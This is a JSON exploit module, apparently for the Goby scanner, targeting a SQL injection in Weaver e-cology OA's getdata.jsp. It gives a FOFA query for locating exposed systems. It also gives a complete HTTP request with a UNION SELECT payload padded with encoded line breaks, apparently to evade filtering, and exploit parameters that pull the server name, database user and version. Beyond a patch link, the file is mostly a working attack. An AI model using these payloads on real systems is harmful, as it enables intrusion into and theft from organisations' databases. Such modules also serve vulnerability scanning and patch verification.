{
  "Name": "Weaver e-cology OA SQLi",
  "Description": "Weaver (e-cology) is a set of enterprise information portals, knowledge management, data center, workflow management, human resource management, customer and partner management, project management, financial management, A collaborative business platform for asset management functions. The e-cology v8 and v9 js/hrm/getdata.jsp files of Fenway have SQL injection vulnerabilities. Attackers can use the vulnerabilities to obtain sensitive database information.",
  "Product": "上海泛微网络科技股份有限公司 e-cology",
  "Homepage": "http://www.weaver.com.cn/",
  "DisclosureDate": "2020-12-15",
  "Author": "mahui@gobies.org",
  "FofaQuery": "app=\"泛微-协同办公OA\" || app=\"Weaver-OA\"",
  "Level": "2",
  "Impact": "攻击者可利用漏洞获取数据库敏感信息。",
  "Recommendation": "厂商已经发布了升级补丁以修复此安全问题，补丁获取链接<a href=\"https://www.weaver.com.cn/cs/securityDownload.asp\">https://www.weaver.com.cn/cs/securityDownload.asp</a>",
  "References": [
    "https://fofa.so"
  ],
  "HasExp": true,
  "ExpParams": [
		{
			"name": "runSql",
			"type": "select",
			"value": "runSql_local,Database_user,Database_version,servername"
		},
		{
			"name": "runSql_local",
			"type": "input",
			"show": "runSql=runSql_local",
			"value": "union+select+ascii(substring(@@servername,14,14)),%272%27,%273%27,%274%27,%275%27,%276%27+where+%27%27=%27"
		}
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "header": {},
        "data": "",
		"data_type": "text",
        "follow_redirect": false,
        "method": "GET",
        "uri": "/js/hrm/getdata.jsp?cmd=forgotPasswordCheck&type=1&loginid=sysadmin111111%27%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0aunion+select+ascii(1),%272%27,%273%27,%274%27,%275%27,%276%27+where+%27%27=%27"
      },
      "ResponseTest": {
        "checks": [
          {
            "bz": "",
            "operation": "==",
            "type": "item",
            "value": "200",
            "variable": "$code"
          },
          {
            "bz": "",
            "operation": "contains",
            "type": "item",
            "value": "\"id\":49",
            "variable": "$body"
          }
        ],
        "operation": "AND",
        "type": "group"
      }
    }
  ],
  "ExploitSteps": [],
  "Tags": ["SQLi"],
  "CVEIDs": null,
  "CVSSScore": null,
  "AttackSurfaces": {
    "Application": ["Weaver-OA"],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  },
"Disable": false
}